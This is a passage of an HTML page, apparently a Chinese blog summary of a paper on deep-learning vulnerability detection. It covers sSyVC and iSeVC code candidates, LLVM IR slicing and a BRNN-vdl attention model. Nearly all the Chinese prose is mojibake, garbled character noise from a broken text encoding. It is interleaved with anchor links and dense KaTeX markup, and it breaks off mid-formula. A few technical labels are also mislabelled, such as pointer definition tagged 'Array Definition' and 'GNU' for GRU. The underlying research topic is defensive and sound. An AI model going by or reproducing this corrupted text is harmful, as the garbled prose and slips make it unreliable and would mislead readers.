æ¼æ´å€™é€‰è¡¨ç¤ºçš„æŒ‡å¯¼åŸåˆ™</h2><ul><li><p><strong>åŸåˆ™1:</strong></p><p>é€‚åº”<strong>è·¨æ–‡ä»¶</strong>çš„è¯­ä¹‰ç›¸å…³çš„ç¨‹åºè¯­å¥ã€‚æœ‰äº›æ–‡ä»¶å¯èƒ½ä¾èµ–äºå…¶ä»–æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ä½¿ç”¨æˆ–å¼•ç”¨çš„å˜é‡å¯èƒ½åœ¨å¦ä¸€ä¸ªæ–‡ä»¶ä¸­å®šä¹‰ã€‚æœ‰æ•ˆçš„æ¼æ´å€™é€‰è¡¨ç¤ºåº”è¯¥é€‚åº”è¿™ç§å®šä¹‰-ä½¿ç”¨å…³ç³»ã€‚</p></li><li><p><strong>åŸåˆ™2:</strong></p><p>é€‚åº”<strong>è·¨å‡½æ•°</strong>çš„è¯­ä¹‰ç›¸å…³çš„ç¨‹åºè¯­å¥ã€‚è¯­ä¹‰ç›¸å…³çš„è¯­å¥å¯èƒ½ä¼šè¶…å‡ºå‡½æ•°çš„è¾¹ç•Œï¼Œè¿™æ„å‘³ç€æœ‰æ•ˆçš„æ¼æ´å€™é€‰è¡¨ç¤ºåº”è¯¥é€‚åº”å¹¶è¿›ä¸€æ­¥ä¿æŒé‚£äº›è¯­ä¹‰ç›¸å…³è¯­å¥çš„é¡ºåºï¼Œå³ä½¿å®ƒä»¬å±äºä¸åŒçš„å‡½æ•°ã€‚</p></li></ul><h2 id="32-æå–ssyvcs"><a class="markdownIt-Anchor" href="#32-æå–ssyvcs"></a> 3.2 æå–sSyVCs</h2><p>å¦‚ä¸Šæ‰€è¿°ï¼Œ<code>sSyVC</code>æ˜¯æ ¹æ®æŸäº›æ¼æ´è¯­æ³•ç‰¹å¾ä»ç¨‹åºä¸­æå–çš„ä¸€æ®µä»£ç ã€‚</p><p>è·å–æ¼æ´è¯­æ³•ç‰¹å¾ç”¨äºæ¼æ´æ£€æµ‹çš„æ–¹æ³•å¯èƒ½æœ‰å¾ˆå¤šã€‚ä½œä¸ºä¸€ä¸ªå…·ä½“çš„ä¾‹å­ï¼Œä½œè€…åˆ©ç”¨å·²çŸ¥æ¼æ´çš„è¯­æ³•ç‰¹å¾ï¼Œå¹¶é€šè¿‡ç¨‹åºæºä»£ç çš„æŠ½è±¡è¯­æ³•æ ‘(ASTæ ‘)è¡¨ç¤ºè¿™äº›ç‰¹å¾(æ›´å‡†ç¡®åœ°è¯´ï¼Œæ˜¯ASTä¸ŠèŠ‚ç‚¹çš„å±æ€§)ã€‚è¿™å°†ç®€åŒ–æ ¹æ®æ¼æ´è¯­æ³•ç‰¹å¾æå–<code>sSyVCs</code>çš„è¿‡ç¨‹ã€‚</p><p>ä½œè€…å®šä¹‰äº†ä»¥ä¸‹å››ç§<strong>æ¼æ´è¯­æ³•ç‰¹å¾</strong>ã€‚</p><ul><li>åº“/APIå‡½æ•°è°ƒç”¨(Library/API Function Call,FC):è¿™ä¸ªæ¼æ´è¯­æ³•ç‰¹å¾æ˜¯ASTä¸Šçš„èŠ‚ç‚¹ç±»å‹æ˜¯å‡½æ•°è°ƒç”¨ï¼Œå‡½æ•°ååŒ¹é…åº“/APIå‡½æ•°åï¼Œå‡½æ•°è°ƒç”¨è‡³å°‘æœ‰ä¸€ä¸ªå‚æ•°æ˜¯å˜é‡ã€‚</li><li>æ•°ç»„å®šä¹‰(Array Definition,AD):è¯¥æ¼æ´è¯­æ³•ç‰¹å¾æ˜¯ASTä¸Šçš„èŠ‚ç‚¹ç±»å‹æ˜¯å˜é‡å£°æ˜ï¼ŒèŠ‚ç‚¹å¯¹åº”çš„ä»£ç åŒ…å«å­—ç¬¦â€™[â€˜å’Œâ€™]â€™ã€‚</li><li>æŒ‡é’ˆå®šä¹‰(Array Definition,PD):è¯¥æ¼æ´è¯­æ³•ç‰¹å¾æ˜¯ASTä¸Šçš„èŠ‚ç‚¹ç±»å‹æ˜¯å˜é‡å£°æ˜ï¼Œä¸”è¯¥èŠ‚ç‚¹å¯¹åº”çš„ä»£ç åŒ…å«å­—ç¬¦â€œâˆ—â€ã€‚</li><li>ç®—æœ¯è¡¨è¾¾å¼(Arithmetic Expression,AE):è¿™ä¸ªæ¼æ´è¯­æ³•ç‰¹å¾æ˜¯ASTä¸Šçš„èŠ‚ç‚¹ç±»å‹æ˜¯èµ‹å€¼è¡¨è¾¾å¼ï¼Œè¯¥èŠ‚ç‚¹åœ¨èµ‹å€¼è¡¨è¾¾å¼çš„å³è¾¹è‡³å°‘æœ‰ä¸€ä¸ªå˜é‡ã€‚</li></ul><p>ç»™å®šä¸€ä¸ªç¨‹åºçš„æºä»£ç ï¼Œå¯ä»¥ç”Ÿæˆå®ƒçš„ASTï¼Œé€šè¿‡è¯†åˆ«å…¶ç±»å‹å’Œä»£ç åŒ¹é…æŸäº›æ¼æ´è¯­æ³•ç‰¹å¾çš„èŠ‚ç‚¹ï¼Œå¯ä»¥ä»ä¸­æå–sSyVCsã€‚å½“ç„¶è¿™äº›è¯­æ³•ç‰¹å¾æœ¬èº«åœ¨æ£€æµ‹æ¼æ´æ–¹é¢è¿œè¿œä¸å¤Ÿï¼Œå› ä¸ºå®ƒä»¬ä¸èƒ½å®¹çº³ä¸æ¼æ´ç›¸å…³çš„é€‚å½“è¯­ä¹‰ä¿¡æ¯ã€‚</p><h2 id="33-ç”Ÿæˆisevcs"><a class="markdownIt-Anchor" href="#33-ç”Ÿæˆisevcs"></a> 3.3 ç”ŸæˆiSeVCs</h2><p>ä¸ä¸Šè¿°åŸåˆ™ç›¸å¯¹åº”çš„æ˜¯ï¼Œç”Ÿæˆ<code>iSeVCs</code>æœ‰ä¸‰ä¸ªç»„ä»¶:</p><ul><li><p>ç”Ÿæˆé“¾æ¥çš„IRæ–‡ä»¶(Intermediate Representation);</p></li><li><p>ç”Ÿæˆ<code>sSyVCs</code>å¯¹åº”çš„IRåˆ‡ç‰‡;</p></li><li><p>å¹¶ç”Ÿæˆ<code>iSeVCs</code>ã€‚</p></li></ul><p>é™„å½•ä¸­çš„ç®—æ³•1æä¾›äº†ç”Ÿæˆ<code>iSeVC</code>çš„è¯¦ç»†ä¿¡æ¯ã€‚</p><h3 id="ç”Ÿæˆé“¾æ¥çš„iræ–‡ä»¶åŸåˆ™1"><a class="markdownIt-Anchor" href="#ç”Ÿæˆé“¾æ¥çš„iræ–‡ä»¶åŸåˆ™1"></a> ç”Ÿæˆé“¾æ¥çš„IRæ–‡ä»¶â€”(åŸåˆ™1)ã€‚</h3><p>è¯¥ç»„ä»¶ä»æºç¨‹åºç”Ÿæˆä¸€ä¸ªæˆ–å¤šä¸ªé“¾æ¥çš„IRæ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤º:</p><ul><li><p>(i) ä½¿ç”¨ç¼–è¯‘å™¨(å¦‚Clang)ä¸ºæ¯ä¸ªæºæ–‡ä»¶ç”Ÿæˆä¸€ä¸ªIRæ–‡ä»¶;</p></li><li><p>(ii) æ ¹æ®IRæ–‡ä»¶çš„ä¾èµ–å…³ç³»é“¾æ¥å®ƒä»¬ï¼Œå¯¼è‡´ä¸€ä¸ªæˆ–å¤šä¸ªIRæ–‡ä»¶é“¾æ¥ã€‚</p></li></ul><p>å›¾4(b)è¯´æ˜äº†ä½¿ç”¨ç¤ºä¾‹<code>sSyVC</code> â€œdataâ€çš„LLVMä¸­é—´ä»£ç çš„æƒ³æ³•ï¼Œè¯¥ç¤ºä¾‹å±äºå›¾4(a)ä¸­æè¿°çš„æºç¨‹åºçš„ç¬¬2è¡Œã€‚ä½œè€…ä½¿ç”¨LLVM IRã€‚å…·ä½“æ¥è¯´ï¼Œä½œè€…ä½¿ç”¨Clangç¼–è¯‘å™¨ç”ŸæˆLLVMä½ç æ–‡ä»¶ï¼Œç„¶åæ ¹æ®å®ƒä»¬çš„ä¾èµ–å…³ç³»å°†å®ƒä»¬é“¾æ¥èµ·æ¥ã€‚</p><h3 id="ç”Ÿæˆå¯¹åº”äºssyvcçš„iråˆ‡ç‰‡å¹¶ç”ŸæˆisevcsåŸåˆ™2"><a class="markdownIt-Anchor" href="#ç”Ÿæˆå¯¹åº”äºssyvcçš„iråˆ‡ç‰‡å¹¶ç”ŸæˆisevcsåŸåˆ™2"></a> ç”Ÿæˆå¯¹åº”äºsSyVCçš„IRåˆ‡ç‰‡å¹¶ç”ŸæˆiSeVCsâ€”(åŸåˆ™2)ã€‚</h3><p>ç»™å®šä¸€ä¸ª<code>sSyVC</code>ï¼Œæˆ‘ä»¬å¯ä»¥ç”Ÿæˆç›¸åº”çš„IRåˆ‡ç‰‡å¦‚ä¸‹:</p><ul><li><p>(i) é€šè¿‡ä»é“¾æ¥çš„IRæ–‡ä»¶ä¸­æå–æ§åˆ¶å’Œæ•°æ®ä¾èµ–æ¥ç”Ÿæˆä¸€ä¸ªä¾èµ–å›¾;</p></li><li><p>(ii) æ ¹æ®æ¯ä¸ª<code>sSyVC</code>å¯¹ä¾èµ–å›¾è¿›è¡Œåˆ‡ç‰‡ï¼Œè¿™å¯ä»¥é€šè¿‡dgç­‰å·¥å…·æ¥å®Œæˆã€‚</p></li></ul><p>å›¾4Â©æç»˜äº†ä¸Šè¿°<code>sSyVC</code>â€œdataâ€å¯¹åº”çš„LLVM  IRåˆ‡ç‰‡ã€‚æ¯ä¸ªå±€éƒ¨å˜é‡ç”¨å‰ç¼€%çš„æ•°å­—å€¼è¡¨ç¤º;å¯¹äºLLVM IRç‰‡ä¸­çš„æ¯ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå±€éƒ¨å˜é‡çš„æ•°å­—å€¼ä¸º1ï¼Œç„¶åå¯¹äºåç»­çš„æ¯ä¸ªå±€éƒ¨å˜é‡ï¼Œå€¼å¢åŠ 1ã€‚</p><p>ç»™å®šIRç‰‡ï¼Œæˆ‘ä»¬ç”Ÿæˆå¦‚ä¸‹<code>iSeVCs</code>ã€‚å¯¹äºå‡½æ•°fÎ±è°ƒç”¨çš„æ¯ä¸ªå‡½æ•°fÎ³ï¼Œå‡½æ•°fÎ³çš„IRåˆ‡ç‰‡ä¸­çš„è¯­å¥è¢«é™„åŠ åˆ°è°ƒç”¨å‡½æ•°fÎ³çš„è¯­å¥(åœ¨å‡½æ•°fÎ±ä¸­)ã€‚è¿™æ˜¯ä¸ºäº†ä¿æŒå¯èƒ½å±äº<strong>ä¸åŒå‡½æ•°ä½†å½¼æ­¤ç›¸å…³</strong>(æ ¹æ®æ§ä»¶å’Œ/æˆ–æ•°æ®ä¾èµ–æ€§)çš„è¯­å¥çš„é¡ºåºã€‚å¦‚æœæœ‰ä¸€ä¸ªå¾ªç¯åºåˆ—çš„å‡½æ•°è°ƒç”¨(ä¾‹å¦‚,fÎ³è°ƒç”¨fÎ±ç„¶åfÎ±è°ƒç”¨fÎ³,ç„¶åfÎ³è°ƒç”¨fÎ±,fÎ±è°ƒç”¨fÎ³,ç­‰ç­‰),æˆ‘ä»¬åªè€ƒè™‘ç¬¬ä¸€ä¸ªå¾ªç¯(ä¹Ÿå°±æ˜¯è¯´,Î³è°ƒç”¨fÎ±ç„¶åÎ±è°ƒç”¨fÎ³ä½†ä¸æ˜¯ä»»ä½•è¿›ä¸€æ­¥çš„),ä»¥é¿å…æ— é™å¾ªç¯ã€‚</p><p>ä¸ºäº†é¿å…åœ¨ä¸åŒå‡½æ•°çš„IRç‰‡ä¸­å°†ç›¸åŒçš„æ•°å€¼èµ‹ç»™ä¸åŒçš„å±€éƒ¨å˜é‡ï¼Œåœ¨é™„åŠ è¯­å¥ä¸­å°†å±€éƒ¨å˜é‡çš„æ¯ä¸ªæ•°å€¼ä¿®æ”¹ä¸ºä¸€ä¸ªæœªèµ‹å€¼çš„æ–°æ•°å€¼ã€‚å›¾4(d)è¯´æ˜äº†å‡½æ•°printLineçš„LLVM IRåˆ‡ç‰‡ä¸­çš„è¯­å¥(ç”¨è™šçº¿æ¡†çªå‡ºæ˜¾ç¤º)è¢«æ·»åŠ åˆ°è°ƒç”¨å‡½æ•°mainçš„è¯­å¥â€œcall void @printLine()â€ä¸­ã€‚åœ¨printLineå‡½æ•°çš„LLVM IRåˆ‡ç‰‡ä¸­ï¼Œå±€éƒ¨å˜é‡â€œ%1â€è¢«ä¿®æ”¹ä¸ºâ€œ%20â€ï¼Œå› ä¸ºâ€œ19â€æ˜¯mainå‡½æ•°ä¸­æœ€åèµ‹å€¼çš„æ•°å€¼ï¼Œå¦‚å›¾4Â©æ‰€ç¤ºã€‚</p><p><img src="/posts/33f70302/image-20211215155227554.png" alt="image-20211215155227554"></p><h1 id="å››-ç»†ç²’åº¦çš„æ¼æ´æ£€æµ‹"><a class="markdownIt-Anchor" href="#å››-ç»†ç²’åº¦çš„æ¼æ´æ£€æµ‹"></a> å››ã€ç»†ç²’åº¦çš„æ¼æ´æ£€æµ‹</h1><h2 id="41-ç»†ç²’åº¦æ¼æ´æ£€æµ‹å™¨çš„éœ€æ±‚"><a class="markdownIt-Anchor" href="#41-ç»†ç²’åº¦æ¼æ´æ£€æµ‹å™¨çš„éœ€æ±‚"></a> 4.1 ç»†ç²’åº¦æ¼æ´æ£€æµ‹å™¨çš„éœ€æ±‚</h2><p>ä½œè€…å¯¹ç¥ç»ç½‘ç»œæ¨¡å‹æå‡ºä»¥ä¸‹ä¸‰ä¸ªè¦æ±‚ï¼Œä»¥æ£€æµ‹å’Œå®šä½æ¼æ´ã€‚</p><ul><li><p><strong>éœ€æ±‚1:ç»†åŒ–ç²’åº¦ã€‚</strong></p><p>ä»£ç çš„ç²’åº¦å†³å®šäº†ç”¨äºåˆ†æçš„æºä»£ç çš„å•ä½ï¼Œå…¶èŒƒå›´å¯ä»¥ä»ç»„ä»¶çš„æœ€ç²—ç²’åº¦ã€åˆ°æ–‡ä»¶ã€åˆ°åŠŸèƒ½ã€åˆ°ä»£ç ç‰‡æ®µã€åˆ°è¯­å¥ï¼Œä»¥åŠåˆ°ä»¤ç‰Œçš„æœ€ç»†ç²’åº¦ã€‚ç»†åŒ–ç²’åº¦å¯¹äºç¡®å®šæ¼æ´æˆ–ç²¾ç¡®åœ°è¯†åˆ«æ˜“å—æ”»å‡»çš„ä»£ç è¡Œè‡³å…³é‡è¦ï¼Œè¿™äº›ä»£ç è¡Œå¯¹åº”äºè¯­å¥ä¸­çš„ç²’åº¦ã€‚è¿™æ˜¯å› ä¸ºæ¼æ´æ£€æµ‹å™¨çš„è¾“å…¥æ˜¯<code>iSeVC</code>ï¼Œå®ƒå¯¹åº”äºä»£ç ç‰‡æ®µä¸­çš„ç²—ç²’åº¦ï¼Œè¿™æ„å‘³ç€æ¼æ´æ£€æµ‹å™¨è¾“å‡ºçš„ç²’åº¦è¦æ¯”è¾“å…¥çš„ç²’åº¦ç»†ã€‚</p></li><li><p><strong>éœ€æ±‚2:æ˜“äºæ˜ å°„ã€‚</strong></p><p>åº”è¯¥å¾ˆå®¹æ˜“å°†ç¥ç»ç½‘ç»œçš„è¾“å‡º(ä»¥ç²¾ç¡®çš„ç²’åº¦)æ˜ å°„å›<code>iSeVC</code>ï¼Œä»¥æŸ¥æ˜æ¼æ´ã€‚è¾“å‡ºåº”è¯¥æ˜¯ä¸€ä¸ªæ ‡è®°åºåˆ—ï¼Œå…¶ä¸­ä¸€ä¸ªæˆ–å¤šä¸ªè¿ç»­çš„æ ‡è®°å¯¹åº”ä¸­é—´ä»£ç ä¸­çš„åŒä¸€è¡Œä»£ç ã€‚è¿™äº›ä¸­é—´ä»£ç è¡Œå¯ä»¥å¾ˆå®¹æ˜“åœ°æ˜ å°„å›<code>iSeVC</code>ï¼Œå› æ­¤ä¹Ÿå¯ä»¥æ˜ å°„å›æºç¨‹åºä¸­æ˜“å—æ”»å‡»çš„ä»£ç è¡Œã€‚</p></li><li><p><strong>éœ€æ±‚3:æ³¨æ„åŠ›ã€‚</strong></p><p>æ³¨æ„åŠ›çš„æ¦‚å¿µå€Ÿç”¨è‡ªæ·±åº¦å­¦ä¹ ï¼Œå¯¹åº”äºå­¦ä¹ è€…åº”è¯¥å…³æ³¨çš„è¾“å…¥çš„é‡è¦éƒ¨åˆ†;ä»æŠ€æœ¯ä¸Šè®²ï¼Œæ³¨æ„åŠ›æ˜¯é€šè¿‡åœ¨ç¥ç»ç½‘ç»œä¸­é€‚å½“åœ°åˆ†é…æƒé‡æ¥å®ç°çš„(å³ï¼Œæ›´å¤šçš„æ³¨æ„åŠ›æ„å‘³ç€æ›´é«˜çš„æƒé‡)ã€‚å¯¹äºä¸€ä¸ªè„†å¼±çš„<code>iSeVC</code>ï¼Œå¾ˆå¯èƒ½åªæœ‰ä¸€ä¸ªæˆ–å‡ ä¸ªè¯­å¥æ˜¯è„†å¼±çš„ï¼Œè€Œå…¶ä»–çš„åˆ™ä¸æ˜¯ï¼Œè¿™æ„å‘³ç€è„†å¼±çš„è¯­å¥æ¯”éè„†å¼±çš„è¯­å¥æ›´â€œé‡è¦â€ï¼Œå› æ­¤åº”è¯¥è¢«ç»™äºˆæ›´é«˜çš„æƒé‡ã€‚</p></li></ul><h2 id="42-æ ‡è®°isevcs"><a class="markdownIt-Anchor" href="#42-æ ‡è®°isevcs"></a> 4.2 æ ‡è®°iSeVCs</h2><p>å¯¹è®­ç»ƒé¡¹ç›®ä¸­çš„<code>iSeVC</code>è¿›è¡Œå¦‚ä¸‹æ ‡è®°:å¦‚æœ<code>iSeVC</code>åŒ…å«ä¸€ä¸ªå·²çŸ¥çš„æ¼æ´ï¼Œ<code>iSeVC</code>å°†è¢«æ ‡è®°ä¸º<code>iSeVC</code>ä¸­æ¼æ´çš„è¡Œå·(å³æ¼æ´çš„ä½ç½®)ï¼Œç”¨x<sub>1</sub>ï¼Œâ€¦ï¼Œ  x<sub>Î¶</sub>è¡¨ç¤ºxi(1 â‰¤ i â‰¤ Î¶)ä¸ºæ¼æ´å¯¹åº”çš„è¡Œå·;å¦åˆ™ï¼Œ<code>iSeVC</code>è¢«æ ‡è®°ä¸ºâ€œ0â€(å³ä¸åŒ…å«æ¼æ´)ã€‚</p><h2 id="43-è®­ç»ƒç¥ç»ç½‘ç»œæ¨¡å‹"><a class="markdownIt-Anchor" href="#43-è®­ç»ƒç¥ç»ç½‘ç»œæ¨¡å‹"></a> 4.3 è®­ç»ƒç¥ç»ç½‘ç»œæ¨¡å‹</h2><p>æ¯ä¸ªiSeVCéœ€è¦è¢«ç¼–ç æˆä¸€ä¸ªå‘é‡ï¼Œç”¨ä½œç¥ç»ç½‘ç»œçš„è¾“å…¥ã€‚</p><p>ç”±äºå¾—åˆ°çš„å‘é‡çš„é•¿åº¦å¯èƒ½ä¸åŒï¼Œè€Œç¥ç»ç½‘ç»œä»¥å›ºå®šé•¿åº¦çš„Î¸ä¸ºè¾“å…¥å‘é‡ï¼Œè¿™äº›å‘é‡å¯èƒ½éœ€è¦è¿›è¡Œå¦‚ä¸‹è°ƒæ•´:å¦‚æœå‘é‡çŸ­äºÎ¸ï¼Œåˆ™åœ¨å‘é‡çš„æœ«ç«¯å¡«å……é›¶;å¦‚æœä¸€ä¸ªå‘é‡æ¯”Î¸é•¿ï¼Œåˆ™è¯¥å‘é‡è¢«æˆªæ–­ä¸ºé•¿åº¦Î¸ï¼Œä½¿sSyVCå‡ºç°åœ¨ç»“æœå‘é‡[17]çš„ä¸­é—´ã€‚</p><h3 id="421-brnnsåŒå‘å¾ªç¯ç¥ç»ç½‘ç»œå®ç°ç®€å•çš„æ˜ å°„"><a class="markdownIt-Anchor" href="#421-brnnsåŒå‘å¾ªç¯ç¥ç»ç½‘ç»œå®ç°ç®€å•çš„æ˜ å°„"></a> 4.2.1 BRNNs(åŒå‘å¾ªç¯ç¥ç»ç½‘ç»œ)å®ç°ç®€å•çš„æ˜ å°„</h3><p>BLSTM (Bidirectional LSTM)ã€BGRU (Bidirectional GRU)ç­‰BRNNsç¡®å®èƒ½å¤Ÿå®ç°ç®€å•çš„æ˜ å°„ï¼ŒåŒæ—¶åˆèƒ½åŒ…å®¹å‰åè¯­å¥ã€‚</p><p>BRNNsä¸èƒ½å®ç°å¦å¤–ä¸¤ä¸ªéœ€æ±‚ï¼Œå› ä¸ºå®ƒä»¬çš„è¾“å‡ºç²’åº¦ä¸è¾“å…¥ç²’åº¦ç›¸åŒ(è€Œä¸æ˜¯ç»†åŒ–è¾“å…¥ç²’åº¦)ï¼Œå®ƒä»¬å¹³ç­‰åœ°å¯¹å¾…è¾“å…¥çš„æ¯ä¸ªéƒ¨åˆ†ã€‚ä½†æ˜¯å¯¹äºæ¼æ´æ£€æµ‹ï¼ŒiSeVCçš„æŸäº›éƒ¨åˆ†(å³è„†å¼±çš„ä»£ç è¡Œ)å¯èƒ½æ¯”iSeVCçš„å…¶ä»–éƒ¨åˆ†æ›´é‡è¦ï¼Œåº”è¯¥ç”±ç¥ç»ç½‘ç»œäºˆä»¥æ›´å¤šçš„å…³æ³¨ã€‚</p><h3 id="422-brnn-vdl-brnnçš„ä¸€ç§æ–°å˜ä½“è¿›ä¸€æ­¥å®ç°äº†æ³¨æ„åŠ›è·å–å’Œç²’åº¦ç»†åŒ–"><a class="markdownIt-Anchor" href="#422-brnn-vdl-brnnçš„ä¸€ç§æ–°å˜ä½“è¿›ä¸€æ­¥å®ç°äº†æ³¨æ„åŠ›è·å–å’Œç²’åº¦ç»†åŒ–"></a> 4.2.2 BRNN-vdl: BRNNçš„ä¸€ç§æ–°å˜ä½“ï¼Œè¿›ä¸€æ­¥å®ç°äº†æ³¨æ„åŠ›è·å–å’Œç²’åº¦ç»†åŒ–</h3><p>å›¾5çªå‡ºäº†BRNN-vdlçš„ç»“æ„ï¼Œè¯¥ç»“æ„æ‰©å±•äº†æ ‡å‡†BRNNï¼Œå¢åŠ äº†ä¸‰å±‚ï¼Œåˆ¶å®šäº†â€œvdlâ€éƒ¨åˆ†ï¼Œä»¥å®ç°ç²’åº¦ç»†åŒ–å’Œæ³¨æ„åŠ›è·å–ã€‚BRNN-vdlçš„è¾“å…¥åŒ…æ‹¬</p><ul><li>(i)è¡¨ç¤ºiSeVCsçš„å‘é‡ï¼Œä»¥åŠ</li><li>(ii)è¡¨ç¤ºæ¯ä¸ªå‘é‡ä¸­æ¼æ´ä½ç½®çš„æ¼æ´ä½ç½®çŸ©é˜µã€‚</li></ul><p>å­¦ä¹ é˜¶æ®µè¾“å‡ºå¸¦æœ‰å¾®è°ƒå‚æ•°çš„BRNN-vdlã€‚</p><p><img src="/posts/33f70302/image-20211221103429273.png" alt="image-20211221103429273"></p><blockquote><p>BRNN-vdlå‘BRNNæ‰©å±•äº†ä¸‰ä¸ªé¢å¤–çš„å±‚(å³ï¼Œ the multiply, Îº-max pooling, and average pooling layers)ï¼Œè¿™äº›å±‚å½¢æˆäº†â€œvdlâ€éƒ¨åˆ†ï¼Œä»¥å®ç°ä¸‰ä¸ªæœŸæœ›çš„å±æ€§ã€‚</p></blockquote><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ç®€è¦å›é¡¾ä¸€ä¸‹BRNNï¼Œç„¶åæè¿°æˆ‘ä»¬ä»‹ç»çš„BRNN-vdlä¸­çš„ä¸‰ä¸ªé¢å¤–å±‚ã€‚</p><h4 id="brnn-vdlä¸­brnnç»„ä»¶çš„æ¦‚è¿°"><a class="markdownIt-Anchor" href="#brnn-vdlä¸­brnnç»„ä»¶çš„æ¦‚è¿°"></a> BRNN-vdlä¸­BRNNç»„ä»¶çš„æ¦‚è¿°</h4><p>å¦‚å›¾5æ‰€ç¤º,æ ‡å‡†BRNNå…·æœ‰</p><ul><li><p>(i)<strong>å¤§é‡çš„BRNNå±‚</strong>,ç”¨æ¥åœ¨å‰åä¸¤ä¸ªæ–¹å‘è¿æ¥RNN(å¾ªç¯ç¥ç»ç½‘ç»œ)ç»†èƒ(ä¾‹å¦‚,LSTMå’ŒGNU)</p></li><li><p>(ii)<strong>è‡´å¯†å±‚</strong>(dense layer),å‡å°‘ä»BRNNå±‚æ¥æ”¶åˆ°çš„å‘é‡çš„ç»´æ•°</p></li><li><p>(3)<strong>æ¿€æ´»å±‚</strong>(activa-tion layer),å®ƒä½¿ç”¨æ¿€æ´»å‡½æ•°åœ¨ä¸€ä¸ªæ—¶é—´æ­¥ä¸­ç”Ÿæˆè¾“å‡ºã€‚</p><p>åœ¨æœ¬æ–‡çš„èƒŒæ™¯ä¸‹ï¼Œè¾“å…¥æ˜¯ä»£è¡¨å¸¦æ ‡ç­¾çš„<code>iSeVC</code>çš„å‘é‡ã€‚æ¯ä¸ªæ—¶é—´æ­¥éª¤å¯¹åº”äº<code>iSeVC</code>ä¸­çš„ä¸€ä¸ªä»¤ç‰Œã€‚åœ¨æ—¶é—´æ­¥é•¿Ï„æ—¶ï¼Œå…¶ä¸­1â‰¤Ï„â‰¤Î»ï¼Œ Î»ä¸ºæ¯ä¸ª<code>iSeVC</code>ä¸­çš„æ ‡è®°æ•°ï¼Œåˆ™<code>iSeVC</code> e<sub>i</sub>çš„BRNNå±‚è¾“å‡ºè¢«è¡¨ç¤ºä¸ºg<sub>Ï„</sub>  (e<sub>i</sub>)</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>g</mi><mi>Ï„</mi></msub><mo stretchy="false">(</mo><msub><mi>e</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>Ï†</mi><mo stretchy="false">(</mo><msub><mi>g</mi><mi>Ï„</mi></msub><mi mathvariant="normal">âˆ’</mi><mn>1</mn><mo stretchy="false">(</mo><msub><mi>e</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>g</mi><mi>Ï„</mi></msub><mo>+</mo><mn>1</mn><mo stretchy="false">(</mo><msub><mi>e</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>e</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>Ï‰</mi><mo separator="true">,</mo><mi>Î²</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g_Ï„ (e_i) =Ï†(g_Ï„âˆ’1(e_i), g_Ï„+1(e_i), e_i,Ï‰,Î²)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.1132em;">Ï„</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">Ï†</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.1132em;">Ï„</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.1132em;">Ï„</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span 